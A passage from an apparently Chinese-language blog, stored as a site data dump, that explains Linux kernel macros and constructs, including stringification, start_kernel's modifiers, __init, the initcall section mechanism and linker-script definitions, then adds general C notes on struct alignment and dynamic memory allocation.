operator）。它的作用是将宏参数转换为字符串字面量。这在宏定义和预处理过程中非常有用，尤其是在需要生成字符串的情况下。</p>\n<p>解释 # 操作符<br>让我们详细解释一下 # 操作符的使用：</p>\n<p>字符串化操作符：</p>\n<p><code>#define TO_STRING(x) #x</code><br>这个宏 TO_STRING 将参数 x 转换为字符串字面量。例如：</p>\n<p><code>TO_STRING(hello)</code><br>这将被预处理器展开为：</p>\n<p><code>&quot;hello&quot;</code><br>在 SYSCALL_METADATA 宏中的使用：</p>\n<p>```.name = “sys”#sname,``<br>这里的 #sname 将 sname 宏参数转换为字符串字面量，并与 “sys” 连接在一起。<br>字符串强化</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> asmlinkage <span class=\"type\">void</span> __init __noreturn <span class=\"title function_\">start_kernel</span><span class=\"params\">(<span class=\"type\">void</span>)</span>;</span><br></pre></td></tr></table></figure>\n<p>这行代码声明了一个函数 start_kernel，其中包含了多个关键字和修饰符。每个关键字都有特定的含义和作用。下面我们逐个详细解释每个关键词的含义及其在这段代码中的用途：</p>\n<p>extern asmlinkage void __init __noreturn start_kernel(void);</p>\n<ol>\n<li><p>extern</p>\n<p> •    含义：extern 关键字表示 start_kernel 是一个外部函数，即它在其他文件中定义，而非在当前文件中实现。<br> •    作用：在多个源文件之间共享函数或变量时，extern 用于告诉编译器该函数的定义在别的文件中。这避免了重复定义的问题，并允许链接器在其他文件中找到函数的实际定义。</p>\n</li>\n</ol>\n<p>在这段代码中，extern 表示 start_kernel 函数的定义位于其他源文件中。</p>\n<ol start=\"2\">\n<li><p>asmlinkage</p>\n<p> •    含义：asmlinkage 是一个宏，用于指定函数的参数传递方式。它告诉编译器，函数的参数应从 堆栈 而不是 寄存器 中传递。<br> •    作用：asmlinkage 在 Linux 内核中常用于定义一些系统调用函数，使得它们可以按照固定的方式接收参数，从而符合调用约定。通过 asmlinkage，内核可以在不同的体系架构上保持一致的参数传递方式，特别是在 x86 和其他架构中。</p>\n</li>\n</ol>\n<p>在 ARM64 中，asmlinkage 会影响函数调用的 ABI（应用程序二进制接口），通常用于系统调用和某些特殊的内核函数，以确保调用者在调用函数时符合规定的参数传递方式。</p>\n<ol start=\"3\">\n<li><p>void</p>\n<p> •    含义：void 表示 start_kernel 函数没有返回值。<br> •    作用：这表明 start_kernel 函数执行后不会向调用者返回任何值。</p>\n</li>\n</ol>\n<p>这是 C 语言中用于声明函数返回值类型的标准关键字。void 返回类型常见于执行一系列操作后无需返回结果的函数。</p>\n<ol start=\"4\">\n<li><p>__init</p>\n<p> •    含义：__init 是一个内核特定的宏，用于标识只在初始化阶段使用的函数或数据。<br> •    作用：在 Linux 内核中，__init 修饰的函数或数据会放入专门的 .init 段（section）。在系统启动完成后，这段内存会被释放，以节省内存资源。</p>\n</li>\n</ol>\n<p>标记为 __init 的函数或数据会在初始化完成后被内核自动丢弃，因此仅在初始化期间有效。在 start_kernel 中使用 __init 表示它是一个只在系统启动时调用的初始化函数。</p>\n<ol start=\"5\">\n<li><p>__noreturn</p>\n<p> •    含义：__noreturn 是一个函数属性，用来告诉编译器该函数不会返回到调用者。<br> •    作用：编译器使用 __noreturn 来优化代码和发出警告。如果一个标记了 __noreturn 的函数尝试返回，编译器会给出警告。</p>\n</li>\n</ol>\n<p>在内核中，__noreturn 表示函数会在执行过程中进入无限循环或在某种情况下导致系统重启、关机等操作，因此永远不会返回。</p>\n<ol start=\"6\">\n<li><p>start_kernel(void)</p>\n<p> •    start_kernel：这是函数的名称，表示该函数是内核启动过程中的主入口点。start_kernel 是 Linux 内核的核心初始化函数，负责从系统启动到内核完全初始化的过渡。<br> •    (void)：表示该函数不接受任何参数。</p>\n</li>\n</ol>\n<p>综合解释</p>\n<p>这行代码声明了一个外部函数 start_kernel，它具有以下特性：</p>\n<pre><code>•    定义在其他源文件中；\n•    参数从堆栈传递；\n•    不返回任何值；\n•    仅在内核初始化阶段有效，之后会被释放；\n•    不会返回给调用者（即它是一个无限循环或最终会导致系统不再执行任何其他代码的函数）；\n</code></pre>\n<p>整体含义</p>\n<p>start_kernel 是内核初始化的入口函数之一，负责从引导加载程序过渡到完全初始化的操作系统内核。它在初始化完成后不再需要，因此标记为 __init。因为这个函数在启动后不会再返回，标记为 __noreturn。</p>\n","site":{"data":{}},"cover":false,"excerpt":"","more":"<h3 id=\"宏定义\"><a href=\"#宏定义\" class=\"headerlink\" title=\"宏定义\"></a>宏定义</h3><h4 id=\"init\"><a href=\"#init\" class=\"headerlink\" title=\"__init:\"></a>__init:</h4><p><code>#define __init        __section(&quot;.init.text&quot;) __cold  __latent_entropy __noinitretpoline __nocfi </code></p>\n<p>__section(“.init.text”)：</p>\n<p>这个指令将函数放置在输出可执行文件的特定段中，本例中为“.init.text”段。这个段通常用于系统启动时需要的初始化程序，初始化完成后可以丢弃，以节省内存。<br>__cold：</p>\n<p>这个属性告诉编译器，该函数不太可能经常执行。这可以帮助编译器优化代码以提高性能，可能通过安排函数的方式来减少其在不经常使用时对指令缓存性能的影响。<br>__latent_entropy：</p>\n<p>这个属性用于增加系统的熵（随机性），这在安全方面特别有用，例如，使依赖于可预测执行模式的攻击更加困难。<br>__noinitretpoline：</p>\n<p>这个属性表明该函数不需要retpoline（返回跳板），这是一种针对某些类型的投机执行侧通道攻击（如Spectre）的缓解技术。<br>__nocfi：</p>\n<p>这个指令告诉编译器不对这个函数应用控制流完整性（CFI）检查。控制流完整性是一种安全特性，通过确保间接函数调用转到有效函数来帮助防止某些类型的攻击。对于某些低级函数，跳过CFI可能是必要的，因为CFI的开销或限制可能会干扰函数的操作。</p>\n<h4 id=\"从device-initcall查看宏定义\"><a href=\"#从device-initcall查看宏定义\" class=\"headerlink\" title=\"从device_initcall查看宏定义\"></a>从device_initcall查看宏定义</h4><p>device_initcall(binder_init)就是将指向binder_init的函数指针，注册在.initcall6.init段里。内核启动时，会调用它，对Binder驱动进行初始化。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">typedef int (*initcall_t)(void);</span><br><span class=\"line\">typedef initcall_t initcall_entry_t;</span><br><span class=\"line\"></span><br><span class=\"line\">/* Format: &lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_&lt;fn&gt; */</span><br><span class=\"line\">#define __initcall_id(fn)\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__KBUILD_MODNAME,\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__COUNTER__,\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(_,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__LINE__,\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(_, fn))))))</span><br><span class=\"line\"></span><br><span class=\"line\">/* Format: __&lt;prefix&gt;__&lt;iid&gt;&lt;id&gt; */</span><br><span class=\"line\">#define __initcall_name(prefix, __iid, id)\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(prefix,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__,\t\t\t\t\t\t\\</span><br><span class=\"line\">\t__PASTE(__iid, id))))</span><br><span class=\"line\">      </span><br><span class=\"line\">#define __initcall_section(__sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t#__sec &quot;.init&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">#define __initcall_stub(fn, __iid, id)\tfn</span><br><span class=\"line\"></span><br><span class=\"line\">#define ____define_initcall(fn, __unused, __name, __sec)\t\\</span><br><span class=\"line\">\tstatic initcall_t __name __used \t\t\t\\</span><br><span class=\"line\">\t\t__attribute__((__section__(__sec))) = fn;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">#define __unique_initcall(fn, id, __sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t____define_initcall(fn,\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_stub(fn, __iid, id),\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_name(initcall, __iid, id),\t\t\\</span><br><span class=\"line\">\t\t__initcall_section(__sec, __iid))</span><br><span class=\"line\"></span><br><span class=\"line\">#define ___define_initcall(fn, id, __sec)\t\t\t\\</span><br><span class=\"line\">\t__unique_initcall(fn, id, __sec, __initcall_id(fn))</span><br><span class=\"line\"></span><br><span class=\"line\">#define __define_initcall(fn, id) ___define_initcall(fn, id, .initcall##id)</span><br><span class=\"line\"></span><br><span class=\"line\">#define device_initcall(fn)\t\t__define_initcall(fn, 6)</span><br></pre></td></tr></table></figure>\n\n<p>device_initcall(binder_init)展开就是：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">device_initcall(binder_init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">__define_initcall(binder_init, 6)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">___define_initcall(binder_init, 6, .initcall6)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">__unique_initcall(binder_init, 6, .initcall6, &lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">____define_initcall(binder_init, </span><br><span class=\"line\">        binder_init,</span><br><span class=\"line\">        __initcall__&lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init6,</span><br><span class=\"line\">        .initcall6.init)</span><br><span class=\"line\">        ↓</span><br><span class=\"line\">static initcall_t __initcall__&lt;modname&gt;__&lt;counter&gt;_&lt;line&gt;_binder_init6 __used </span><br><span class=\"line\">      __attribute__((__section__(.initcall6.init))) = binder_init;</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"initcall-id\"><a href=\"#initcall-id\" class=\"headerlink\" title=\"__initcall_id\"></a>__initcall_id</h5><p>这段代码定义了一个宏 __initcall_id(fn)，其目的是生成一个唯一的标识符，用于内核初始化函数（initcall）。这个宏通过多层嵌套的 __PASTE 宏，将几个预处理器变量和函数名结合成一个连续的字符串。下面是对这个宏的详细解释：</p>\n<p><em>组件解释</em></p>\n<ul>\n<li>__KBUILD_MODNAME：<br>这是一个由内核构建系统定义的宏，它表示正在编译的模块的名称。如果代码不是为模块编译的，它通常是内核的名称或为空。</li>\n<li>__COUNTER__：<br>这是一个特殊的预处理器变量，每次出现在源代码中时都会递增。__COUNTER__ 用于在编译过程中生成唯一的序列号，确保每次宏展开时都得到一个不同的值。是GNU 编译器的非标准编译器扩展，可以认为它是一个计数器，代表一个整数，它的值一般被初始化为0，在每次编译器编译到它时，会自动 +1。</li>\n<li>__LINE__：<br>这个宏展开为当前代码行的行号。它在源代码中是唯一的，除非多个宏展开发生在同一行。</li>\n<li>fn：<br>这是宏的参数，表示将要注册的初始化函数的名字。</li>\n<li>__PASTE 宏<br>__PASTE 宏的目的是将两个参数连接在一起（没有空格）。__initcall_id 宏通过多次使用 __PASTE，将上述元素拼接成一个单一的、唯一的标识符。这种连续使用 __PASTE 的方式确保了不同部分之间没有空格，并且生成的字符串是平滑连续的。</li>\n</ul>\n<p><em>完整的宏展开过程</em><br>    如果我们假设：<br>    __KBUILD_MODNAME 是 “mykernelmodule”<br>    __COUNTER__ 当前是 42<br>    __LINE__ 是 123<br>    fn 是 init_my_device<br>宏展开的结果将是：<code>mykernelmodule__42_123_init_my_device</code><br>这个结果是由以下步骤生成的：</p>\n<ol>\n<li>首先连接 mykernelmodule 和 _，结果是 mykernelmodule__。</li>\n<li>然后连接前面的结果和 42，得到 mykernelmodule__42。</li>\n<li>接着连接 _ 和 123，再和前面的结果连接，得到 mykernelmodule__42_123。</li>\n<li>最后将 init_my_device 通过 _ 连接上去，得到最终的字符串 mykernelmodule__42_123_init_my_device。</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define __initcall_section(__sec, __iid)\t\t\t\\</span><br><span class=\"line\">\t#__sec &quot;.init&quot;</span><br><span class=\"line\">这个宏 __initcall_section(__sec, __iid) 定义了一个用于生成内核初始化代码段名的格式。宏的工作是把传入的 __sec 和字符串 .init 拼接起来，构成一个用于特定初始化函数的ELF段（section）名称。这里，__iid 参数虽然在宏定义中出现，但在实际的字符串连接操作中没有被使用，可能是为了保持与其他相关宏的参数格式一致性，或为未来的扩展预留。</span><br></pre></td></tr></table></figure>\n<p>详细解释：</p>\n<ul>\n<li>#__sec：<br>这部分使用了字符串化操作符 #，它会将宏参数转化为一个字符串。这意味着传入的宏参数 __sec 会被转换成一个字面量字符串。</li>\n<li>“.init”：<br>这是一个直接的字符串常量，表示初始化段的后缀。在Linux内核中，用于初始化代码的段通常以 .init 结尾，比如 .init.text、.init.data 等。<br>拼接：</li>\n</ul>\n<p>宏中没有明显的连接操作（如 ## 运算符），但在宏的用法中，这两部分（#__sec 和 “.init”）通过宏替换自然连接成一个完整的字符串。<br>使用例子：<br>假设有如下调用：</p>\n<p>__initcall_section(my_section, 123)<br>根据宏的定义，这将展开为：</p>\n<p>“my_section.init”<br>这里，my_section 被字符串化并与 .init 后缀连接，生成一个新的字符串，表示一个内核ELF段的名称。</p>\n<h4 id=\"initcall机制\"><a href=\"#initcall机制\" class=\"headerlink\" title=\"initcall机制\"></a>initcall机制</h4><p>当我们试图将一个驱动程序加载进内核时，我们需要提供一个<code>xxx_init()</code>函数。这样内核才会定位到该函数，加载驱动，初始化驱动。<br><code>binder_init()</code>就是这样一个初始化驱动的函数。但是怎么向内核注册这样一个函数呢？直观的做法是维护一个初始化驱动的函数指针的数组，将<code>binder_init()</code>添加进该数组中。不过这样在多人开发时，容易造成编码冲突。<br>linux采用了更优雅的方法——initcall机制：<br>在内核镜像文件中，自定义一个段，这个段里面专门用来存放这些初始化函数的地址，内核启动时，只需要在这个段地址处取出函数指针，一个个执行即可。</p>\n<h5 id=\"initcallXX-init段\"><a href=\"#initcallXX-init段\" class=\"headerlink\" title=\".initcallXX.init段\"></a>.initcallXX.init段</h5><p><code>.initcallXX.init</code>段就是专门用来存放各个内核模块的初始化函数的地址。</p>\n<p><code>device_initcall(fn)</code>就是表示将指向fn的函数指针，存放在<code>.initcall6.init</code>段。类似的宏定义有：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define pure_initcall(fn)\t\t__define_initcall(fn, 0)              →  .initcall0.init</span><br><span class=\"line\">#define core_initcall(fn)\t\t__define_initcall(fn, 1)              →  .initcall1.init</span><br><span class=\"line\">#define core_initcall_sync(fn)\t\t__define_initcall(fn, 1s)             →  .initcall1s.init</span><br><span class=\"line\">#define postcore_initcall(fn)\t\t__define_initcall(fn, 2)              →  .initcall2.init</span><br><span class=\"line\">#define postcore_initcall_sync(fn)\t__define_initcall(fn, 2s)             →  .initcall2s.init</span><br><span class=\"line\">#define arch_initcall(fn)\t\t__define_initcall(fn, 3)              →  .initcall3.init</span><br><span class=\"line\">#define arch_initcall_sync(fn)\t\t__define_initcall(fn, 3s)             →  .initcall3s.init</span><br><span class=\"line\">#define subsys_initcall(fn)\t\t__define_initcall(fn, 4)              →  .initcall4.init</span><br><span class=\"line\">#define subsys_initcall_sync(fn)\t__define_initcall(fn, 4s)             →  .initcall4s.init</span><br><span class=\"line\">#define fs_initcall(fn)\t\t\t__define_initcall(fn, 5)              →  .initcall5.init</span><br><span class=\"line\">#define fs_initcall_sync(fn)\t\t__define_initcall(fn, 5s)             →  .initcall5s.init</span><br><span class=\"line\">#define rootfs_initcall(fn)\t\t__define_initcall(fn, rootfs)         →  .initcallrootfs.init</span><br><span class=\"line\">#define device_initcall(fn)\t\t__define_initcall(fn, 6)              →  .initcall6.init</span><br><span class=\"line\">#define device_initcall_sync(fn)\t__define_initcall(fn, 6s)             →  .initcall6s.init</span><br><span class=\"line\">#define late_initcall(fn)\t\t__define_initcall(fn, 7)              →  .initcall7.init</span><br><span class=\"line\">#define late_initcall_sync(fn)\t\t__define_initcall(fn, 7s)             →  .initcall7s.init</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"initcallXX-init段的定义\"><a href=\"#initcallXX-init段的定义\" class=\"headerlink\" title=\".initcallXX.init段的定义\"></a>.initcallXX.init段的定义</h4><p>.initcallXX.init段的定义是在common/include/asm-generic/vmlinux.lds.h和common/arch/arm64/kernel/vmlinux.lds.S中。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//common/include/asm-generic/vmlinux.lds.h</span><br><span class=\"line\">#define INIT_CALLS_LEVEL(level)\t\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall##level##_start = .;\t\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcall##level##.init))\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcall##level##s.init))\t\t\t\\</span><br><span class=\"line\"></span><br><span class=\"line\">#define INIT_CALLS\t\t\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_start = .;\t\t\t\t\t\\</span><br><span class=\"line\">\t\tKEEP(*(.initcallearly.init))\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(0)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(1)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(2)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(3)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(4)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(5)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(rootfs)\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(6)\t\t\t\t\t\\</span><br><span class=\"line\">\t\tINIT_CALLS_LEVEL(7)\t\t\t\t\t\\</span><br><span class=\"line\">\t\t__initcall_end = .;</span><br><span class=\"line\">                </span><br><span class=\"line\">//common/arch/arm64/kernel/vmlinux.lds.S</span><br><span class=\"line\">SECTIONS</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">        .init.data : &#123;</span><br><span class=\"line\">\t\tINIT_DATA</span><br><span class=\"line\">\t\tINIT_SETUP(16)</span><br><span class=\"line\">\t\tINIT_CALLS</span><br><span class=\"line\">\t\tCON_INITCALL</span><br><span class=\"line\">\t\tINIT_RAM_FS</span><br><span class=\"line\">\t\t*(.init.altinstructions .init.bss)\t/* from the EFI stub */</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">        ...</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>参考：<a href=\"https://www.cnblogs.com/jianhua1992/p/16852793.html\">https://www.cnblogs.com/jianhua1992/p/16852793.html</a><br>解释：</p>\n<ul>\n<li><em>()<br>在链接器脚本中确实用作通配符。在链接器脚本的语法中，</em>() 用于匹配符合特定模式的所有符号或者段(section)。这种用法允许链接器指令应用于多个相关的符号或段，而不需要单独列举它们。这是组织和控制链接输出文件的一个强大特性，特别是在操作系统内核或其他复杂软件系统的构建中。</li>\n</ul>\n<p>KEEP(<em>(.initcall##level##.init)) 和 KEEP(</em>(.initcall##level##s.init)) 使用了通配符 * 来包含所有在特定命名模式的段中的符号。这里的通配符 * 表示匹配所有符号，而括号内的表达式定义了要匹配的段名。例如：</p>\n<p>.initcall0.init<br>.initcall1.init<br>.initcall0s.init<br>.initcall1s.init</p>\n<p>*(.initcall##level##.init)：</p>\n<p>这表示匹配所有在 .initcall<level>.init 段中的符号。例如，如果 level 是 0，则匹配 .initcall0.init 段中的所有符号。<br>*(.initcall##level##s.init)：</p>\n<p>类似地，这表示匹配所有在 .initcall<level>s.init 段中的符号。这个 s 后缀可能代表某种特定类型的初始化调用，如同步初始化调用。<br>为什么使用 KEEP<br>KEEP 指令在链接器脚本中用来确保即使没有被程序的其他部分直接引用，也不会被链接器优化掉（即不被删除）。这对于初始化代码特别重要，因为这些代码在执行完毕后通常不会再被其他运行时代码直接引用，但它们在系统启动阶段是必需的。通过使用 KEEP，可以保证这些重要的初始化段不会因为“看似”未被使用而被剔除，确保内核能够按预期顺序执行这些初始化步骤。</p>\n<p>这种机制是内核和其他底层系统软件能够精确控制初始化过程的关键，特别是在涉及到内存和资源优化的上下文中。</p>\n<ul>\n<li>##在宏定义中的作用是将多个符号连接成一个符号，并不将其字符串化</li>\n</ul>\n<h3 id=\"标号元素\"><a href=\"#标号元素\" class=\"headerlink\" title=\"标号元素\"></a>标号元素</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">static const struct file_operations __maybe_unused kmem_fops = &#123;</span><br><span class=\"line\">    .llseek     = memory_lseek,</span><br><span class=\"line\">    .read       = read_kmem,</span><br><span class=\"line\">    .write      = write_kmem,</span><br><span class=\"line\">    .mmap       = mmap_kmem,</span><br><span class=\"line\">    .open       = open_kmem,</span><br><span class=\"line\">#ifndef CONFIG_MMU</span><br><span class=\"line\">    .get_unmapped_area = get_unmapped_area_mem,</span><br><span class=\"line\">    .mmap_capabilities = memory_mmap_capabilities,</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h4 id=\"解释\"><a href=\"#解释\" class=\"headerlink\" title=\"解释\"></a>解释</h4><ol>\n<li>结构体声明与类型<br>struct file_operations：这是一个预定义的结构体类型，通常在Linux内核源代码中定义，用于描述文件操作相关的函数指针。</li>\n<li>修饰符和存储类<br>static：表示这个结构体变量 kmem_fops 的作用域限制在定义它的文件内，外部文件不能访问它。<br>const：表示这个结构体变量是常量，一旦初始化后，其内容不应被修改。<br>__maybe_unused：这是一个编译器指示，用于告诉编译器这个变量可能在代码中未被使用，这可以避免编译器发出未使用变量的警告。这通常用在可能因为不同的编译配置而使用或不使用的变量上。</li>\n<li>结构体成员初始化<br>.llseek = memory_lseek，.read = read_kmem，等：这种使用点（.）后跟成员名的初始化方式是C99标准中引入的指定初始化器（designated initializer）。它允许在初始化结构体时直接指定每个成员的值，而不需要依赖于成员在结构体中的顺序。</li>\n<li>条件编译<br>#ifndef CONFIG_MMU … #endif：这是预处理指令，用于条件编译。它检查 CONFIG_MMU 是否未被定义。如果未定义 CONFIG_MMU，则编译器会编译这两行代码：<br>.get_unmapped_area = get_unmapped_area_mem<br>.mmap_capabilities = memory_mmap_capabilities<br>这通常在不同的硬件配置或内核配置选项下使用，以适应不同的系统需求。</li>\n</ol>\n<p>当在内核模块中将 memory_lseek 函数指定给 file_operations 结构体的 .llseek 成员时，任何针对该设备文件的 lseek 系统调用最终都会调用你的 memory_lseek 函数。</p>\n<h4 id=\"使用\"><a href=\"#使用\" class=\"headerlink\" title=\"使用\"></a>使用</h4><p>这里是详细的调用流程：</p>\n<p>用户空间调用：当用户空间的程序调用 lseek() 函数时，这个调用最初由标准C库（例如glibc）封装，该库将系统调用参数封装为适当的系统调用请求。<br>系统调用转换：系统调用接口在内核中接收到这个请求后，会找到与文件描述符关联的 file 结构体实例。<br>文件操作结构体：每个打开的文件在内核中都有一个与之关联的 file 结构体，这个结构体包含了指向 file_operations 结构体的指针。file_operations 结构体为各种文件操作定义了具体的函数指针，如打开、读取、写入、定位等。<br>调用 .llseek：如果对应的 file_operations 结构体中的 .llseek 成员被设置为 memory_lseek，那么内核就会调用 memory_lseek 函数来处理这个定位请求。<br>执行定位操作：memory_lseek 函数将根据提供的参数（文件指针、偏移量和起始位置标志）计算新的文件位置，并将这个新位置返回给调用者。如果操作有效，返回的就是新的文件偏移量；如果无效（如偏移量无效或操作不被支持），则返回错误码。</p>\n<p>c语言结构体大小计算规则：<br>1、结构体变量的首地址，必须是结构体变量中的“最大基本数据类型成员所占字节数”的整数倍。（对齐）<br>2、结构体变量中的每个成员相对于结构体首地址的偏移量，都是该成员基本数据类型所占字节的整数倍。（对齐）<br>3、结构体变量的总大小，为结构体变量中“最大基本数据类型成员所占字节数”的整数倍（补齐）</p>\n<p>–<br>typedef struct Work_{<br>    int num;</p>\n<p>}Work_;</p>\n<p>如果不对自己起别名，直接用<br>Work_ work=new Work_(); 会报错，必须用 struct Work_ work=new Work_();<br>–</p>\n<p>c:内存申请</p>\n<p>栈：占最大内存中的2M,开辟内存的方式是静态内存开辟，比如：函数内声明变量，函数方法结束后会自动回收<br>堆：占最大内存中的80%，动态内存开辟，不会自动回收,必须手动回收。malloc()开辟，free()释放</p>\n<p>利用realloc扩展内存，如果原来的内存不足以向下扩展，会重新找一块足够的内存，因此，指针指向的地址会变动。<br>动态申请内存时有可能会失败，所以会返回null,如果是扩展内存返回null,那么需要把malloc的内存释放掉<br>释放时，也务必进行空指针判断，释放完最好把指针置空<br>‘’’<br>//动态开辟内存<br>void dyMemoryTest(int num,int newNum){<br>    int* arrPoint= (int*)malloc(10<em>1024</em>1024*sizeof(int)); //40M</p>\n<pre><code>//必须手动释放\nif(arrPoint)&#123;\n    free(arrPoint);  \n&#125;\nint* arrPoint2=(int*)malloc(num*sizeof(int));\nif(arrPoint2)&#123;\n    for(int i=0;i&lt;num;i++)&#123;\n        *(arrPoint2+i)=i;\n    &#125;\n&#125;\nint* arrPoint3 =(int *)realloc(arrPoint2,(num+newNum)*sizeof(int));\nif(arrPoint3)&#123;\n    for(int i=num;i&lt;num+newNum;i++)&#123;\n        *(arrPoint3+i)=i;\n    &#125;\n    for(int i=0;i&lt;num+newNum;i++)&#123;\n        LOGD(&quot;the number is %d ,the value is %d&quot;,i,*(arrPoint3+i));\n    &#125;\n    //成功了，只释放旧指针就行\n    free(arrPoint3);\n    arrPoint3= nullptr;\n&#125;else&#123;\n    //没有成功，释放旧指针\n    if(arrPoint2)&#123;\n        free(arrPoint2);\n    &#125;\n&#125;\n</code></pre>\n<p>}<br>‘’’</p>\n<p>linux config example:</p>\n<p>CONFIG_FTRACE_SYSCALLS 是一个内核配置选项，用于控制是否启用系统调用的函数追踪（ftrace）功能.</p>\n<p>linux/syscalls.h</p>\n<figure class=\"highlight 